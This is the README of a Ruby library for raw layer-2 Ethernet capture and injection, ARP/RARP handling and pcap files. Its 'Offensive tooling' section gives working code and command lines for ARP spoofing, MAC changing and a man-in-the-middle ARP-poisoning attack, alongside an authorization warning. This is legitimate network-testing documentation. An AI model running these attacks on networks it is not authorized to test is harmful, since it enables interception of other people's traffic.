# datalink-socket

[![CI](https://github.com/jeanmichel-gh/datalink-socket/actions/workflows/ci.yml/badge.svg)](https://github.com/jeanmichel-gh/datalink-socket/actions/workflows/ci.yml)

Capture and inject raw Ethernet (layer 2) frames in Ruby. Build and parse
ARP and RARP. Spoof, masquerade, and run a man-in-the-middle ARP attack.

A ground-up rewrite of the original 2011 library.

## What you get

- A datalink socket that captures and injects whole Ethernet frames.
- Pluggable backends: `AF_PACKET` on Linux, `BPF` on macOS and BSD, plus
  `loopback` and `pcap_file` backends that need no privileges.
- `MAC` and `Frame` value objects, including 802.1Q VLAN tags.
- ARP with a request/reply API and an IP-to-MAC resolver.
- RARP (Reverse ARP).
- ARP spoofing, MAC masquerade, and a bidirectional MITM attack.
- Read and write `.pcap` files that open in Wireshark.
- A 69-test suite that runs with no root, plus a live socket smoke test.

The packet and protocol code is pure Ruby and needs no privileges. Only
the live Linux and BSD backends need root or `CAP_NET_RAW`.

## Install

Not on RubyGems yet. Install from source:

```sh
git clone https://github.com/jeanmichel-gh/datalink-socket
cd datalink-socket
bundle install
```

Then run Ruby with the lib on the load path (`ruby -Ilib ...`), or add
the checkout to your own `$LOAD_PATH`.

Once the gem is published, this will be:

```sh
gem install datalink-socket
```

Requires Ruby 3.1 or newer.

## Before you start

The live examples need two things: the name of your interface, and your
own MAC address. Find them with:

```sh
ip link                 # Linux: interface names and MACs
ifconfig                # macOS / BSD: same
```

In the snippets below, replace `eth0` with your interface and set:

```ruby
require "datalink"
my_mac = Datalink::MAC.new("00:11:22:33:44:55")   # your NIC's MAC
my_ip  = "192.168.1.10"                            # your IP on the segment
```

## Module layout

```
Datalink::MAC          # MAC address value object
Datalink::Frame        # Ethernet II frame (encode/parse, VLAN)
Datalink::EtherType    # EtherType constants and names
Datalink::Socket       # live capture/inject facade over backends
Datalink::ARP          # ARP packets, request/reply, Resolver
Datalink::RARP         # Reverse ARP
Datalink::Spoof        # ARP spoofing primitives
Datalink::Masquerade   # change/restore an interface MAC
Datalink::Attack::ArpPoison  # bidirectional MITM
```

Backends live under `Datalink::Backends`: `Linux`, `BPF`, `Loopback`,
`PcapFile`.

## Frames

```ruby
require "datalink"

frame = Datalink::Frame.new(
  dst: "ff:ff:ff:ff:ff:ff",
  src: "00:11:22:33:44:55",
  ether_type: Datalink::EtherType::ARP,
  payload: "..."
)
frame.to_shex          # hex of the wire bytes

parsed = Datalink::Frame.parse(bytes)
parsed.src             # => #<Datalink::MAC 00:11:22:33:44:55>
parsed.ether_type_name # => "ARP"

# 802.1Q VLAN tags are set on build and read on parse:
tagged = Datalink::Frame.new(dst: "...", src: "...", ether_type: 0x0800,
                             vlan_id: 100, payload: "...")
```

## MAC addresses

```ruby
Datalink::MAC.new("00:11:22:33:44:55")   # colon, dash, dotted, or bare hex
Datalink::MAC.new("0011.2233.4455")      # all parse to the same address
Datalink::MAC.broadcast                  # ff:ff:ff:ff:ff:ff
Datalink::MAC.random                     # random local, unicast MAC

mac = Datalink::MAC.new("01:00:5e:00:00:05")
mac.multicast?   # => true
mac.to_s(".")    # => "0100.5e00.0005"
```

`MAC` is immutable and compares by value, so it works as a Hash key.

## Capture and inject live (needs root)

```ruby
Datalink::Socket.open("eth0") do |sock|
  sock.recv_timeout = 2
  sock.each_frame { |f| puts f }   # yields frames until the timeout passes
  sock.send(frame)
end
```

`each_frame` stops when no frame arrives within `recv_timeout`. Without a
timeout it blocks for each frame.

## ARP

```ruby
# Build a request (returns a ready-to-send broadcast frame)
req = Datalink::ARP.request(
  sender_mac: my_mac,
  sender_ip:  my_ip,
  target_ip:  "192.168.1.1"
)

# Resolve an IP to a MAC over a live socket
Datalink::Socket.open("eth0") do |sock|
  r = Datalink::ARP::Resolver.new(sock, sender_mac: my_mac, sender_ip: my_ip)
  mac = r.resolve("192.168.1.1", timeout: 2)   # => MAC or nil
end
```

## RARP

```ruby
# A diskless host asking for its own IP (knows only its MAC)
Datalink::RARP.request(sender_mac: my_mac, target_mac: my_mac)

# A server answering with the assigned IP
Datalink::RARP.reply(
  sender_mac: server_mac, sender_ip: "192.168.1.1",
  target_mac: client_mac, target_ip: "192.168.1.50"
)
```

## Read and write pcap files (no privileges)

```ruby
Datalink::Socket.open("out.pcap", backend: :pcap_file, mode: :write) do |w|
  w.send(frame)
end
# out.pcap opens in Wireshark.

Datalink::Socket.open("out.pcap", backend: :pcap_file, mode: :read) do |r|
  r.each_frame { |f| puts f }
end
```

## Offensive tooling

These intercept or forge traffic.

> **Only use these on networks you own or are explicitly authorized to
> test. Forging ARP or intercepting other hosts' traffic is illegal in
> most places. You are responsible for how you use this.**

### Spoof one host

```ruby
Datalink::Socket.open("eth0") do |sock|
  s = Datalink::Spoof.new(sock, attacker_mac: my_mac)
  # Tell the victim the gateway is at my MAC:
  s.poison(victim_ip: "192.168.1.50", victim_mac: victim_mac,
           spoofed_ip: "192.168.1.1")
  # ... later, heal the cache with the real mapping:
  s.restore(ip: "192.168.1.1", mac: real_gateway_mac)
end
```

### Masquerade (change your NIC's MAC)

```ruby
m = Datalink::Masquerade.new("eth0")
m.randomize            # or m.set("02:11:22:33:44:55")
m.restore              # back to the original
```

### Man-in-the-middle

```ruby
Datalink::Socket.open("eth0") do |sock|
  atk = Datalink::Attack::ArpPoison.new(
    sock,
    attacker_mac: my_mac, attacker_ip: my_ip,
    victim_ip: "192.168.1.50", gateway_ip: "192.168.1.1",
    forward: true, logger: $stderr
  )
  atk.run(duration: 60)   # blocks; poisons both sides, forwards, restores on exit
end
```

`run` blocks for `duration` seconds. With `forward: true` the tool relays
frames at layer 2 so the victim stays connected. For a full MITM that
does not break the victim's traffic, also enable IP forwarding in the
kernel (for example `sysctl -w net.ipv4.ip_forward=1` on Linux). On exit,
`run` broadcasts the correct mappings so both caches heal.

### Command-line examples

```sh
# Discover hosts on a subnet
sudo ruby -Ilib exe/arp-scan -i eth0 -s 192.168.1.10 -m 00:11:22:33:44:55 192.168.1.0/24

# Run a MITM for 60s (prompts for confirmation)
sudo ruby -Ilib exe/arp-spoof -i eth0 -s 192.168.1.99 -m 00:11:22:33:44:55 \
     --victim 192.168.1.50 --gateway 192.168.1.1 --duration 60
```

## Platform support

| OS       | Backend   | Notes                                   |
|----------|-----------|-----------------------------------------|
| Linux    | AF_PACKET | needs root or `CAP_NET_RAW`             |
| macOS    | BPF       | needs root / access to `/dev/bpf*`      |
| FreeBSD  | BPF       | same as macOS                           |
| any      | loopback  | in-memory, for tests                    |
| any      | pcap_file | read/write `.pcap`, for offline work    |

Windows is not supported out of the box. Raw layer 2 there needs Npcap
and a separate backend.

## Tests

```sh
bundle install
bundle exec rake test            # unit + functional, no privileges
bundle exec rake test:unit
bundle exec rake test:functional

# Live backend (needs root):
sudo ruby -Ilib test/live/smoke_linux.rb
```

The unit and functional suites run anywhere with no privileges, using the
`loopback` and `pcap_file` backends. CI runs them on Ruby 3.1 through 3.4
on every push, plus the live socket smoke test.

## License

Same terms as Ruby. See `LICENSE`.
